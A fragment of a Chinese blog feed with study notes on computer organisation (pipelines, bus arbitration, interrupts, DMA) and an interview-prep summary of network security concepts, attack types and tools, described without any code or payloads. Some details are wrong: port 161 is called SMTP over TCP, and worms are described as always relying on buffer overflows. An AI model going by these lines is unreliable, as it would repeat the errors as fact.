title="数据相关处理机制"></a>数据相关处理机制</h5><ul><li><strong>软件方法</strong>（编译器完成）<ul><li>插入空指令</li><li>调整程序顺序，使相关性在流水线中消失</li></ul></li><li><strong>硬件方法</strong><ul><li>插入气泡（空操作）<ul><li>向后段插入气泡（接口信号清零）</li><li>向前给出阻塞信号（流水线停顿）避免当前指令被新指令取代</li></ul></li><li>数据重定向bypass（数据旁路）<ul><li>将后端处理后的数据（还没来得及写回）重定向</li><li>数据在哪就从哪送到运算器</li></ul></li></ul></li></ul><p><img src="/../pic/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86.assets/image-20220626102439589.png" alt="image-20220626102439589"></p><h4 id="7-4-流水线的异常与中断"><a href="#7-4-流水线的异常与中断" class="headerlink" title="7.4 流水线的异常与中断"></a>7.4 流水线的异常与中断</h4><p><img src="/../pic/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86.assets/image-20220626102938743.png" alt="image-20220626102938743"></p><h4 id="7-5-指令集并行技术"><a href="#7-5-指令集并行技术" class="headerlink" title="7.5 指令集并行技术"></a>7.5 指令集并行技术</h4><ul><li><strong>超流水线</strong>(superpipelined)<ul><li>技术主要通过增加流水线功能段数目，尽可能细化减少各段关键延迟，从而提高流水线主频的方式提升流水线性能，例如Pentium pro的流水线就多达14段</li></ul></li><li><strong>多发射</strong> (multiple issue)<ul><li>复制计算机内部功能部件的数量，使各流水功能段能同时处理多条指令，处理器一次可以发射多条指令进入流水线进行处理。引起更多的相关性，冲突冒险问题更难处理</li></ul></li><li><strong>静态多发射</strong><ul><li>冲突冒险全部交给编译器静态解决</li></ul></li><li><strong>动态多发射</strong><ul><li>由硬件动态处理多发射流水线运行过程中出现的各种冲突冒险</li><li>也称为超标量 (superscalar)技术</li></ul></li></ul><h3 id="第八章-互连及输入输出组织"><a href="#第八章-互连及输入输出组织" class="headerlink" title="第八章 互连及输入输出组织"></a>第八章 互连及输入输出组织</h3><h4 id="1、总线及系统传输机制"><a href="#1、总线及系统传输机制" class="headerlink" title="1、总线及系统传输机制"></a>1、总线及系统传输机制</h4><h5 id="总线性能指标"><a href="#总线性能指标" class="headerlink" title="总线性能指标"></a>总线性能指标</h5><ul><li><p>总线频率：反映总线工作的速率（f），通常单位是MHz</p></li><li><p>总线宽度：数据总线的位数(w)，单位是b(位)</p><p>是微型计算机的一个重要指标，通常与处理器的字长相一致</p></li><li><p>总线传输速率：总线上可传输的数据总量（BW），单位是MB&#x2F;S</p><ul><li>总线传输速率&#x3D;（总线宽度÷8位)×总线频率</li><li>BW&#x3D;(w÷8)×f</li></ul></li></ul><h4 id="2、总线传输机制"><a href="#2、总线传输机制" class="headerlink" title="2、总线传输机制"></a>2、总线传输机制</h4><h5 id="总线传输过程"><a href="#总线传输过程" class="headerlink" title="总线传输过程"></a>总线传输过程</h5><ul><li>总线申请: （总线仲裁）<ul><li>需要使用总线的主部件提出请求，总线控制器确定将下一个总线使用权分配给谁</li></ul></li><li>地址阶段: （总线寻址）<ul><li>主设备通过总线发出从部件的存储器地址或I&#x2F;O端口地址及相关命令，启动从设备</li></ul></li><li>数据阶段:  (数据传输）</li><li>结束阶段:<ul><li>主部件撤消总线请求等有关信息，让出总线，以便总线控制器重新分配总线使用权</li></ul></li></ul><h5 id="总线事务"><a href="#总线事务" class="headerlink" title="总线事务"></a>总线事务</h5><ul><li>总线事务：总线上主从设备之间的一次信息交换过程<ul><li>一个总线周期中发生的一系列活动:  请求阶段、寻址阶段、传输阶段、结束阶段</li><li>典型事务：存储器读，存储器写，I&#x2F;O读，I&#x2F;O写，中断响应，DMA响应</li></ul></li><li>突发(猝发)传送事务（Burst Mode 成组传送）<ul><li>多个数据阶段，传输过程不释放总线</li></ul></li></ul><p><img src="/../pic/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86.assets/image-20220626145754276.png" alt="image-20220626145754276"></p><p><img src="/../pic/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86.assets/image-20220626150040978.png" alt="image-20220626150040978"></p><h5 id="x3D-x3D-总线的仲裁-x3D-x3D"><a href="#x3D-x3D-总线的仲裁-x3D-x3D" class="headerlink" title="&#x3D;&#x3D;总线的仲裁&#x3D;&#x3D;"></a>&#x3D;&#x3D;总线的仲裁&#x3D;&#x3D;</h5><ul><li><p>总线仲裁：对总线的使用进行合理的分配和管理.</p><ul><li>部件要使用总线进行通信时,要向控制部件发请求信号</li><li>控制部件按各部件的优先级来决定谁使用总线</li></ul></li><li><p>根据总线控制部件的位置,仲裁方式分两类</p><ul><li>集中式总线仲裁<ul><li>链式查询方式</li><li>计数器定时查询方式</li><li>独立请求方式</li></ul></li><li>分布式总线仲裁</li></ul></li></ul><p><strong>链式查询方式</strong></p><p><img src="/../pic/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86.assets/image-20220626150433399.png" alt="image-20220626150433399"></p><p><strong>计数器定时查询方式</strong></p><p><img src="/../pic/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86.assets/image-20220626150452836.png" alt="image-20220626150452836"></p><p><strong>独立请求方式</strong></p><p><img src="/../pic/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86.assets/image-20220626150506969.png" alt="image-20220626150506969"></p><table><thead><tr><th></th><th><strong>链式查询方式</strong></th><th><strong>计数器定时查询</strong></th><th><strong>独立请求方式</strong></th></tr></thead><tbody><tr><td><strong>控制线</strong></td><td>BS、BR、BG 共3根</td><td>BS、BR、log2n共 2+log2n</td><td>n组（BR、BG）共2n根</td></tr><tr><td><strong>响应速度</strong></td><td>慢</td><td>慢</td><td>快</td></tr><tr><td><strong>优先级</strong></td><td>优先级固定</td><td>可作适当变化</td><td>可作灵活的变化</td></tr><tr><td><strong>故障敏感度</strong></td><td>非常敏感</td><td>不敏感</td><td>不敏感</td></tr><tr><td><strong>扩展方式</strong></td><td>容易</td><td>难</td><td>容易</td></tr></tbody></table><h4 id="3、I-x2F-O设备与主机进行数据交换的三种基本方式"><a href="#3、I-x2F-O设备与主机进行数据交换的三种基本方式" class="headerlink" title="3、I&#x2F;O设备与主机进行数据交换的三种基本方式"></a>3、I&#x2F;O设备与主机进行数据交换的三种基本方式</h4><ul><li><strong>程序直接控制方式</strong>（最简单的I&#x2F;O方式）<ul><li>无条件传送：对简单外设定时（同步）进行数据传送</li><li>条件传送：Polling (轮询，查询):  OS主动查询，也称为程序查询方式<ul><li>I&#x2F;O设备（包括I&#x2F;O接口）将自己的状态放到一个状态寄存器中 </li><li>OS阶段性地查询状态寄存器中的特定状态，以决定下一步动作</li></ul></li></ul></li><li><strong>I&#x2F;O Interrupt (中断I&#x2F;O方式)</strong>: 几乎所有系统都支持的中断I&#x2F;O方式<ul><li>若一个I&#x2F;O设备需要CPU干预，它就通过中断请求通知CPU</li><li>CPU中止当前程序的执行，调出OS（中断处理程序）来执行</li><li>处理结束后，再返回到被中止的程序继续执行</li><li>OS是被动调出的，也称为中断驱动I&#x2F;O方式</li></ul></li><li><strong>Direct Memory Access (DMA方式)</strong>: 磁盘等高速外设特有的I&#x2F;O方式<ul><li>磁盘等高速外设成批地直接和主存进行数据交换</li><li>需要专门的DMA控制器控制总线，完成数据传送</li><li>当外设准备好数据后，向DMA控制器发DMA请求信号，DMA控制器再向CPU发总线请求，CPU让出总线后，由DMA控制器控制总线进行传输，无需CPU干涉</li></ul></li></ul><h5 id="中断I-x2F-O方式"><a href="#中断I-x2F-O方式" class="headerlink" title="中断I&#x2F;O方式"></a>中断I&#x2F;O方式</h5><p> 当外设准备好时，便向CPU发中断请求，CPU响应后，中止现行程序的执行，转入一个“中断服务程序”进行输入&#x2F;出操作，实现主机和外设接口之间的数据传送，并启动外设工作。 “中断服务程序”执行完后，返回原被中止的程序断点处继续执行。此时，外设和CPU并行工作。</p><p><img src="/../pic/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86.assets/image-20220626152350654.png" alt="image-20220626152350654"></p><h6 id="同时中断请求的处理方法"><a href="#同时中断请求的处理方法" class="headerlink" title="同时中断请求的处理方法"></a>同时中断请求的处理方法</h6><p><img src="/../pic/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86.assets/image-20220626152621852.png" alt="image-20220626152621852"></p><h6 id="划分优先级的一般规律"><a href="#划分优先级的一般规律" class="headerlink" title="划分优先级的一般规律"></a>划分优先级的一般规律</h6><ul><li>硬件故障中断属于最高级，其次是程序错误中断</li><li>非屏蔽中断优于可屏蔽中断</li><li>DMA请求优先于I&#x2F;O设备传送的中断请求</li><li>高速设备优于低速设备</li><li>输入设备的中断优于输出设备</li><li>实时设备优先于普通设备</li></ul><h6 id="多重中断的概念"><a href="#多重中断的概念" class="headerlink" title="多重中断的概念"></a>多重中断的概念</h6><ul><li><p>多重中断和中断处理优先权的动态分配</p><ul><li><p>多重中断的概念：</p><p>在一个中断处理（即执行中断服务程序）过程中，若又有新的中断请求发生，而新中断优先级高于正在执行的中断，则应立即中止正在执行的中断服务程序，转去处理新的中断。这种情况为多重中断，也称中断嵌套。</p></li></ul></li><li><p>中断优先级的概念：</p><ul><li>中断响应优先级—-由查询程序或硬联排队线路决定的优先权，反映多个中断同时请求时选择哪个响应。</li><li>中断处理优先级—-由各自的中断屏蔽字来动态设定，反映本中断与其它中断间的关系。</li></ul></li></ul><h6 id="中断屏蔽字"><a href="#中断屏蔽字" class="headerlink" title="中断屏蔽字"></a>中断屏蔽字</h6><p><img src="/../pic/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86.assets/image-20220626154643907.png" alt="image-20220626154643907"></p><h5 id="DMA方式"><a href="#DMA方式" class="headerlink" title="DMA方式"></a>DMA方式</h5><h6 id="DMA数据传送方式"><a href="#DMA数据传送方式" class="headerlink" title="DMA数据传送方式"></a>DMA数据传送方式</h6><p>由于DMA接口和CPU共享主存，所以可能出现两者争用主存的现象，为使两者协调使用主存，DMA通常采用以下三种方式进行数据传送。</p><ol><li>CPU停止法(成组传送)</li></ol><p>  DMA传输时，CPU脱离总线，停止访问主存，直到DMA传送一块数据结束。<br>   <img src="/../pic/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86.assets/image-20220626154824645.png" alt="image-20220626154824645"></p><ol start="2"><li>周期挪用(窃取)法(单字传送)</li></ol><p>  DMA传输时，CPU让出一个总线事务周期，由DMA控制总线来访问主存，传送完一个数据后立即释放总线。</p><p>   <img src="/../pic/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86.assets/image-20220626154859080.png" alt="image-20220626154859080"></p><ol start="3"><li>交替分时访问法</li></ol><p>  每个存储周期分成两个时间片，一个给CPU，一个给DMA，这样在每个存储周期内，CPU和DMA都可访问存储器。</p><p>   <img src="/../pic/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86.assets/image-20220626154849726.png" alt="image-20220626154849726"></p><h5 id="x3D-x3D-例题：中断、DMA方式下CPU的开销-x3D-x3D"><a href="#x3D-x3D-例题：中断、DMA方式下CPU的开销-x3D-x3D" class="headerlink" title="&#x3D;&#x3D;例题：中断、DMA方式下CPU的开销&#x3D;&#x3D;"></a>&#x3D;&#x3D;例题：中断、DMA方式下CPU的开销&#x3D;&#x3D;</h5><p><img src="/../pic/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86.assets/image-20220626155407232.png" alt="image-20220626155407232"></p><p><img src="/../pic/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86.assets/image-20220626155411957.png" alt="image-20220626155411957"></p>]]></content>
      
      
      <categories>
          
          <category> log </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>面试Record</title>
      <link href="/2022/06/16/%E9%9D%A2%E8%AF%95/"/>
      <url>/2022/06/16/%E9%9D%A2%E8%AF%95/</url>
      
        <content type="html"><![CDATA[<h1 id="面试Record"><a href="#面试Record" class="headerlink" title="面试Record"></a>面试Record</h1><h4 id="信息安全三要素CIA"><a href="#信息安全三要素CIA" class="headerlink" title="信息安全三要素CIA"></a>信息安全三要素CIA</h4><p><strong>保密性</strong>（Confidentiality）：保证信息不泄露给未经授权的用户。<br><strong>完整性</strong>（Integrity）：保证信息从真实的发信者传送到真实的收信者手中，传送过程中没有被非法用户添加、删除、替换等。<br><strong>可用性</strong>（Availability）：保证授权用户能对数据进行及时可靠的访问。<br>另：可控性（Controllability），不可否认性（Non-Repudiation）</p><h4 id="防火墙技术"><a href="#防火墙技术" class="headerlink" title="防火墙技术"></a>防火墙技术</h4><p>防火墙就是计算机网络中的边境检查站，保护内部网络。防火墙有多种形态，一般是软硬件相结合。主要功能是进行<strong>访问控制，内容控制</strong>。主要有三种技术，分别是<strong>包过滤技术，状态监测技术</strong>，以及<strong>代理服务技术</strong>。在屏蔽主机的系统模型中，内外网边界有一个网关路由器，复杂进行包过滤，内网有一个堡垒主机，负责代理服务，两者相互配合实现防火墙的功能。同时防火墙也有一些局限性。<br><a href="https://blog.csdn.net/qq_39328436/article/details/115054500">https://blog.csdn.net/qq_39328436/article/details/115054500</a></p><h4 id="入侵检测技术"><a href="#入侵检测技术" class="headerlink" title="入侵检测技术"></a>入侵检测技术</h4><p>网络中的入侵检测系统（Intrusion Detection System, IDS）就如同物理世界的防盗自动警铃一样，对周围正在进行的各种活动进行监视。有两种模型，一种是基于主机的IDS，一种是基于网络的IDS。这两种模型比较相似，核心部件都是通信流收集器，分析引擎以及特征数据库。基于主机的IDS搜集本机的日志文件和其他关键文件，基于网络的IDS搜集的是流经本网段的所有数据包。分析引擎获得数据之后与特征数据库中的记录进行模式匹配，从而觉得哪些行为是好的，哪些行为是坏的。<br><a href="https://blog.csdn.net/qq_39328436/article/details/115084272">https://blog.csdn.net/qq_39328436/article/details/115084272</a></p><h4 id="身份认证技术"><a href="#身份认证技术" class="headerlink" title="身份认证技术"></a>身份认证技术</h4><p>身份认证技术用来确定用户的合法身份。有基于口令的身份认证技术，双因素身份认证，基于x509证书的身份认证，基于USB key的身份认证，基于生物特征的身份认证，以及各种身份认证协议，比如说Kerberos，针对PPP协议的PAP以及CHAP等<br><a href="https://blog.csdn.net/qq_39328436/article/details/115177458">https://blog.csdn.net/qq_39328436/article/details/115177458</a></p><h4 id="物理层安全问题"><a href="#物理层安全问题" class="headerlink" title="物理层安全问题"></a>物理层安全问题</h4><p>在共享式局域网上，攻击者可以嗅探到其他设备发送的消息，利用交换机的自学习功能，发起MAC地址泛洪攻击，使得交换机的流量隔离作用失效，可以将嗅探的范围进一步扩大</p><p><a href="https://blog.csdn.net/qq_39328436/article/details/115118488">https://blog.csdn.net/qq_39328436/article/details/115118488</a></p><h4 id="网络层安全问题"><a href="#网络层安全问题" class="headerlink" title="网络层安全问题"></a>网络层安全问题</h4><p>关于ARP协议，由于计算机会对收到的每个ARP应答报文作出响应，并更新自己的ARP缓冲表，攻击者利用这个漏洞可以发起中间人攻击，或者用地址冲突使得目标主机不能联网。关于ip协议，由于ip的源地址不可靠，攻击者可以利用这个漏洞发起盲目飞行攻击以及利用源路由机制发起中间人攻击，针对这个漏洞可以采用单播反向验证进行预防。关于ICMP协议，利用回送报文可以发起smurf攻击，利用路由重定向报文可以改变主机的路由。</p><p><a href="https://blog.csdn.net/qq_39328436/article/details/115119347">https://blog.csdn.net/qq_39328436/article/details/115119347</a></p><h4 id="传输层安全问题"><a href="#传输层安全问题" class="headerlink" title="传输层安全问题"></a>传输层安全问题</h4><p>TCP的四种常见攻击方式，分别是SYN泛洪攻击，RST复位攻击，会话劫持以及ACK风暴。针对UDP的攻击主要是DOS攻击，常见的是用包来冲击DNS服务器等。<br><a href="https://blog.csdn.net/qq_39328436/article/details/115126996">https://blog.csdn.net/qq_39328436/article/details/115126996</a></p><h4 id="应用层安全问题"><a href="#应用层安全问题" class="headerlink" title="应用层安全问题"></a>应用层安全问题</h4><p>针对DHCP协议，攻击者可以伪造大量的DHCP发现报文，消耗地址池中所有的地址，也可以伪造DHCP释放报文，让ip地址被重复分配，或者伪造DHCP提供报文，为客户提供无效的ip地址。针对DNS协议，攻击者可以发起DOS攻击，伪造大量的DNS查询报文，淹没DNS服务器，或者淹没主机，还可以伪造DNS应答报文，恶意篡改域名和ip对应的地址项，发起DNS劫持。针对http协议，可以发起sql注入。<br><a href="https://blog.csdn.net/qq_39328436/article/details/115141362">https://blog.csdn.net/qq_39328436/article/details/115141362</a></p><h4 id="访问控制"><a href="#访问控制" class="headerlink" title="访问控制"></a>访问控制</h4><p>主要学了4种访问控制模型。自主访问控制（DAC）的特点是客体的创建者可以授予其他主体对客体的访问权限，十分灵活，实现方式有访问控制矩阵，访问控制列表，访问控制能力列表。访问控制矩阵是一个三元组，包括主体，客体和访问权限；访问控制列表是以文件为中心创建的，而访问控制能力列表则是基于用户为中心创建的。第二种访问控制策略是强访问控制(MAC)，这是一种基于安全级别的访问控制，每一个主体和客体都被授予了不同的安全级别，通过判断主客体之间的安全级别进行访问控制。第三种策略是基于角色的访问控制(RBAC)，与上面两种访问控制不同的是这种策略不直接对用户授予权限，而是给用户赋予不同的角色，每个角色有不同的权限。由于基于角色的访问控制可能带来角色爆炸的情况，因此有第四种访问控制，即基于属性的访问控制(ABAC)，每个用户携带自己的属性，包括主体属性，资源属性和环境属性来访问客体，授权引擎根据这些属性进行访问控制。<br><a href="https://blog.csdn.net/qq_39328436/article/details/115277008">https://blog.csdn.net/qq_39328436/article/details/115277008</a></p><h4 id="密码学"><a href="#密码学" class="headerlink" title="密码学"></a>密码学</h4><p>首先是加解密算法，总体分为对称加密算法和非对称加密算法，这两者的区别在于对称加密算法用一个秘钥进行加密解密，通信双方需要协商秘钥，Diffle-Hellman协议便是用于对称加密体制中的秘钥协商的，而非对称加密算法用不同的秘钥进行加解密。对称加密算法又分为流密码和分组密码，两者的区别在于是否对明文分进行分组加密。流密码的代表是RC4，分组密码有DES和AES，DES的加解密过程要经过16轮Feistel 结构，AES的加解密过程要经过字节代换，行位移，列混合等等。对称加密双方要协商秘钥，秘钥管理压力很大，因此引入了非对称加密。非对称加密的代表是RSA和ECC算法，RSA是基于大整数分解困难问题，ECC基于椭圆曲线离散对数问题，相较与RSA而言，ECC的秘钥更短，更适用于公交卡等小容量的硬件设施。第二个部分讲到散列函数，密码学中的散列函数与数据结构中的散列函数有所不同，安全的散列函数要求有三个特点：第一单向性，强无碰撞性，压缩性。目前主流的散列函数有MD5,SHA-0,SHA-1等。第三个部分介绍了基于散列函数的数字签名，它的作用是为了进行身份认证以及保护数据的完整性。数字签名算法有RSA和DSS，RSA是一种既可以用于加密又可以用于签名的算法，DSS算法基于离散对数困难问题。最后一个部分介绍了数字证书，其目的是保证公钥不会被冒充。<br><a href="https://blog.csdn.net/qq_39328436/article/details/115269492">https://blog.csdn.net/qq_39328436/article/details/115269492</a></p><h4 id="安全协议"><a href="#安全协议" class="headerlink" title="安全协议"></a>安全协议</h4><p>IPSEC: 位于网络层,这是一个安全协议组，主要的功能是认证和加密，为了实现认证和加密需要有秘钥管理和交换的功能，分别由AH,ESP,IKE三个组件实现；<br>SSL&#x2F;TLS: 位于传输层和应用层之间，可以细分为两个子层，分别是SSL记录协议层，SSL握手协议层，分别完整信息的封装，压缩，加密以及通信双方身份认证，秘钥管理的功能，SSL可以和引用层的http协议配合形成https，也可以保证邮件协议的安全。<br>kerberos:位于应用层，这是一个身份认证协议。<br>MIME:运用在SMTP之上,MIME除了加密解密的功能之外，还能使得原本只能传输ASCII码SMTP协议更加丰富多彩<br>PGP:运用在SMTP之上，是pretty good privacy的缩写，是一个安全保障的应用程序<br>SET:这是一个专门针对于信用卡电子支付的安全协议，保证银行，商家和顾客之间的一致性和安全性问题。<br><a href="https://blog.csdn.net/qq_39328436/article/details/115243776">https://blog.csdn.net/qq_39328436/article/details/115243776</a></p><h4 id="蠕虫-VS-木马-VS-病毒"><a href="#蠕虫-VS-木马-VS-病毒" class="headerlink" title="蠕虫 VS 木马 VS 病毒"></a>蠕虫 VS 木马 VS 病毒</h4><p>木马和病毒蠕虫的区别在于，利用木马可以建立远程连接，远程控制受害者主机<br>蠕虫与病毒木马的区别在于，它的原理是利用缓冲区溢出漏洞修改函数返回值的方式进行自动的攻击。<br><a href="https://blog.csdn.net/qq_39328436/article/details/115246804">https://blog.csdn.net/qq_39328436/article/details/115246804</a></p><h4 id="蜜罐"><a href="#蜜罐" class="headerlink" title="蜜罐"></a>蜜罐</h4><p>蜜罐是一个陷阱，在攻击者角度看到的是一个有漏洞的真实网络，安全人员的角度是一个模拟真实网络的软件。攻击者攻击蜜罐时安全人员可以分析攻击者的行为，他想干什么，干了什么，用了什么安全工具等，用以更好的维护网络安全。<br><a href="https://blog.csdn.net/qq_39328436/article/details/115085028">https://blog.csdn.net/qq_39328436/article/details/115085028</a></p><h4 id="Session机制与token机制"><a href="#Session机制与token机制" class="headerlink" title="Session机制与token机制"></a>Session机制与token机制</h4><p>联系：cookie和session都是用来跟踪浏览器用户身份的会话方式<br>区别：<a href="https://blog.csdn.net/qq_39328436/article/details/115064971">https://blog.csdn.net/qq_39328436/article/details/115064971</a></p><h4 id="渗透测试"><a href="#渗透测试" class="headerlink" title="渗透测试"></a>渗透测试</h4><p>对”中国结算”进行渗透测试，主要是三个部分的工作，第一个部分是信息搜集，具体包括域名信息，真实ip，常用端口号等等。第二部分是利用一些渗透测试工具进行漏洞扫描，具体包括SQLmap，BurpSiute，Nmap等。第三个部分就是编写渗透测试报告。最后我们发现了5个中级漏洞和8个轻级漏洞。<br><a href="https://blog.csdn.net/qq_39328436/article/details/114240902">https://blog.csdn.net/qq_39328436/article/details/114240902</a></p><h4 id="漏洞与攻击"><a href="#漏洞与攻击" class="headerlink" title="漏洞与攻击"></a>漏洞与攻击</h4><h5 id="1-sql注入"><a href="#1-sql注入" class="headerlink" title="1.sql注入"></a>1.sql注入</h5><p>原理：攻击者利用发送给sql服务器的输入数据构造可执行的代码<br><a href="https://blog.csdn.net/qq_39328436/article/details/114295554">https://blog.csdn.net/qq_39328436/article/details/114295554</a></p><h5 id="2-XSS注入"><a href="#2-XSS注入" class="headerlink" title="2.XSS注入"></a>2.XSS注入</h5><p>原理：在html页面中注入javascript代码，用户浏览页面时执行恶意代码<br><a href="https://blog.csdn.net/qq_39328436/article/details/114240561">https://blog.csdn.net/qq_39328436/article/details/114240561</a></p><h5 id="3-CSRF攻击"><a href="#3-CSRF攻击" class="headerlink" title="3.CSRF攻击"></a>3.CSRF攻击</h5><p>款站点请求伪造：攻击者伪造一个链接设法让已经登录的用户访问，以此来以用户的身份执行某些非法操作<br><a href="https://blog.csdn.net/qq_39328436/article/details/114333010">https://blog.csdn.net/qq_39328436/article/details/114333010</a></p><h5 id="4-与session相关的漏洞"><a href="#4-与session相关的漏洞" class="headerlink" title="4.与session相关的漏洞"></a>4.与session相关的漏洞</h5><p>cookie劫持：攻击者获取了已经登录的用户的cookie，冒充用户身份<br>固定会话攻击：攻击者伪造了一个cookie,让用户根据这个cookie登录账户，此后攻击者便可以冒充用户身份<br>session保持：session没有设置失效时间<br><a href="https://blog.csdn.net/qq_39328436/article/details/114262076">https://blog.csdn.net/qq_39328436/article/details/114262076</a></p><h5 id="5-点击劫持攻击"><a href="#5-点击劫持攻击" class="headerlink" title="5.点击劫持攻击"></a>5.点击劫持攻击</h5><p>攻击者使用一个透明的，不可见的iframe,覆盖在一个网页上，诱使用户点击</p><h5 id="6-文件上传漏洞"><a href="#6-文件上传漏洞" class="headerlink" title="6.文件上传漏洞"></a>6.文件上传漏洞</h5><p>用户上传了一个可执行的脚本文件，并通过脚本文件获得了执行服务端命令的能力。<br>上传文件本身是一个正常的业务需求，问题在于文件上传后，服务器怎么处理解释文件，如果服务器处理逻辑做得不够安全，这将会导致严重的后果。</p><h5 id="7-伪随机数问题"><a href="#7-伪随机数问题" class="headerlink" title="7.伪随机数问题"></a>7.伪随机数问题</h5><p>伪随机数是通过一些数学算法生成的随机数，并非真正的随机数，可以被预测。对应“真正的随机数”应该是通过一些物理系统生成的随机数，比如说电压的波动，空中电磁波的噪声等。</p><h5 id="8-分布式拒绝服务攻击DDOS"><a href="#8-分布式拒绝服务攻击DDOS" class="headerlink" title="8.分布式拒绝服务攻击DDOS"></a>8.分布式拒绝服务攻击DDOS</h5><p>服务器的资源是有限的，如果资源被攻击者恶意占用，那么服务器就无法向真正的用户提供服务。</p><p><strong>常见DOS攻击：</strong>(1)SYN Flooding(洪泛)攻击；(2)ICMP洪泛攻击；(3)UDP洪泛攻击；(4)Ping of Death攻击；(5)IP欺骗DoS攻击；(6)IP分片攻击；(7)Teardrop(泪滴)攻击；(8)Land攻击；(9)Smurf攻击；(10)Fraggle攻击；(11)WinNuke攻击；(12)电子邮件轰炸。</p><h4 id="安全工具："><a href="#安全工具：" class="headerlink" title="安全工具："></a>安全工具：</h4><h5 id="Nessus"><a href="#Nessus" class="headerlink" title="Nessus"></a>Nessus</h5><p>是一款系统漏洞扫描和分析软件</p><h5 id="wireshark"><a href="#wireshark" class="headerlink" title="wireshark"></a>wireshark</h5><p>网络包分析工具，抓下来包之后能够分析出详细的封包资料</p><h5 id="burpsuite"><a href="#burpsuite" class="headerlink" title="burpsuite"></a>burpsuite</h5><p>它有很多功能，我们经常用到的就是代理和扫描器<br>代理：是一个拦截http&#x2F;s的代理服务器，作为浏览器和服务器之间的中间人，可以通过burpsuite对数据包进行拦截，修改，查看两个方向上的数据流<br><a href="https://blog.csdn.net/qq_39328436/article/details/114265338">https://blog.csdn.net/qq_39328436/article/details/114265338</a></p><h5 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h5><p>自动化的sql注入工具，主要功能是扫描然后发现并利用sql注入漏洞<br><a href="https://blog.csdn.net/qq_39328436/article/details/114399837">https://blog.csdn.net/qq_39328436/article/details/114399837</a></p><h5 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h5><p>端口扫描工具：<a href="https://blog.csdn.net/qq_39328436/article/details/114404267">https://blog.csdn.net/qq_39328436/article/details/114404267</a></p><h5 id="L0phtCrack：密码破解工具"><a href="#L0phtCrack：密码破解工具" class="headerlink" title="L0phtCrack：密码破解工具"></a>L0phtCrack：密码破解工具</h5><h5 id="RootkitRevealer"><a href="#RootkitRevealer" class="headerlink" title="RootkitRevealer"></a>RootkitRevealer</h5><p>RootkitRevealer 是一个高级 rootkit 检测实用程序。它在 Windows XP（32 位）和 Windows Server 2003（32 位）上运行，其输出列出了注册表和文件系统 API 差异，这些差异可能表明存在用户模式或内核模式 rootkit。</p><h5 id="chkrootkit"><a href="#chkrootkit" class="headerlink" title="chkrootkit"></a>chkrootkit</h5><p>是一个在本地检查rootkit迹象的工具</p><h5 id="Autoruns"><a href="#Autoruns" class="headerlink" title="Autoruns"></a>Autoruns</h5><p>该实用程序对任何启动监视器的自动启动位置有最全面的了解，向您显示在系统启动或登录期间配置为运行哪些程序，以及何时启动各种内置 Windows 应用程序，如 Internet Explorer、资源管理器和媒体播放器。</p><h5 id="ListDLLs"><a href="#ListDLLs" class="headerlink" title="ListDLLs"></a>ListDLLs</h5><p>是一个实用程序，用于报告加载到进程中的 DLL。您可以使用它列出加载到所有进程、特定进程中的所有 DLL，或列出加载了特定 DLL 的进程。ListDLL 还可以显示 DLL 的完整版本信息，包括其数字签名，并可用于扫描进程以查找未签名的 DLL。</p><h5 id="嗅探器"><a href="#嗅探器" class="headerlink" title="嗅探器"></a>嗅探器</h5><p>Tcpdump、Wireshark、windump、NAI Sniffer（不需要Winpcap（libpcap）支持）</p><h4 id="常用端口号及服务："><a href="#常用端口号及服务：" class="headerlink" title="常用端口号及服务："></a><em><strong>常用端口号及服务：</strong></em></h4><p>20端口：FTP服务器真正传输所用的端口，用于上传、下载</p><p>21端口：FTP 文件传输服务<strong>（TCP）</strong></p><p>22端口：SSH 远程连接服务<strong>（TCP）</strong></p><p>23端口：TELNET 终端仿真服务，远程登陆协议<strong>（TCP）</strong></p><p>25端口：SMTP 简单邮件传输服务</p><p>53端口：DNS 域名解析服务，<strong>（UDP）</strong></p><p>79 端口：Finger服务</p><p>80端口：HTTP 超文本传输服务<strong>（TCP）</strong></p><p>110端口：POP3，用于支持使用客户端远程管理在服务器上的电子邮件。<strong>（TCP）</strong></p><p>119端口：Network News Transfer Protocol，NEWS新闻组传输协议，承载USENET通信</p><p>161端口：SMTP，Simple Network Management Protocol，简单网络管理协议<strong>（TCP）</strong></p><p>162端口：SNMP Trap，SNMP陷阱<strong>（UDP）</strong></p><p>443端口：HTTPS 加密的超文本传输服务<strong>（TCP）</strong></p><p>445端口：CIFS，公共Internet文件系统</p><p>1080端口：Socks代理服务</p><p>1433端口：sql server，Microsoft的SQL服务开放的端口 